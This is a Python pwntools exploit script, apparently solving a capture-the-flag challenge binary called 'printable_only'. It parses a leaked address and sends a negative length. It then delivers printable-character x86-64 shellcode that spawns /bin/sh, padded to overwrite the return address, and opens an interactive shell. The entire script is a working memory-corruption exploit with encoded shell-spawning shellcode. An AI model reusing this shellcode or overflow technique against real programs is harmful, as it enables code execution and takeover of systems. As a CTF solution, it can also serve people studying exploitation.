from pwn import *

context.binary = binary = "./printable_only"
context.update(arch="amd64", os="linux")

elf = ELF(binary)
rop = ROP(elf)
gs = ""
def start():
    """
    Start the exploit against the target.
    if args.GDB is set, then we will attach gdb to the process
    else we will run the process normally.

    example:
        python solve.py GDB # will attach gdb to the process
        python solve.py # will run the process normally
    """
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)


# Start the process
p = start()
# read untill the pattern b'number: ' consumed.
p.recvuntil(b"number: ")
leak = p.recvuntil(b"\n").strip()

print(leak)
target_address = int(leak, 16)
target_address = p32(target_address)[:4]
print("Writing line")
p.writeline(str(-1))

p.recvuntil(b"trash: ")

shellcode = b'h0000X-0000P^PYPZPhn/shh//biT[TX-dUUU-bUUU-bUUUP\VXHf5T6f5fIPXXh;000X-0000'
payload = shellcode + (b'a' * (52)) + target_address

f = open("payload.txt", 'wb')
f.write(payload)
f.close()

p.sendline(payload)
print(payload)

p.interactive()
p.close() 